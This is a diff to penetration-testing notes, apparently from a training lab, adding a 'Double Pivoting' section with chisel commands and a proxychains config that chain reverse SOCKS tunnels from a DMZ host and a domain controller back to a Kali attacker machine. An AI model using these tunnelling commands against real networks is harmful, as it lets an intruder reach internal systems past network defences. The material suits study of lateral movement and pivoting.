@@ -82,6 +82,23 @@ Replace <kaliIP> with the IP address of your Kali machine. This command will ins
 ./chisel server --reverse --port 9002. This will start Chisel in server mode and listen for connections on port 9002.
 chisel.exe client <kaliIP>:9002 R:40000:localhost:40000
 ```
+
+Double Pivoting
+Kali (10.10.14.227) <<10.10.14.0/24>> DMZ01 (10.129.58.6 | 172.16.8.120) <<192.16.8.0/24>> DC01 (172.16.8.3 | 172.16.9.3) <<172.16.9.0/24>> MGMT01 (172.16.9.25)
+```
+kali: ./chisel_linux server --socks5 -p 9001 --reverse
+
+/etc/proxychains:
+socks5 127.0.0.1 9999
+socks5 127.0.0.1 8888
+
+DMZ01:
+./chisel_linux client 10.10.14.227:9001 R:9999:socks
+./chisel_linux server  -p 9002 --reverse --socks5
+
+DC01:
+chisel.exe client 172.16.8.120:9002 R:8888:socks
+```
 ### Windows Port forwarding
 ###### PLINK.exe
 ```
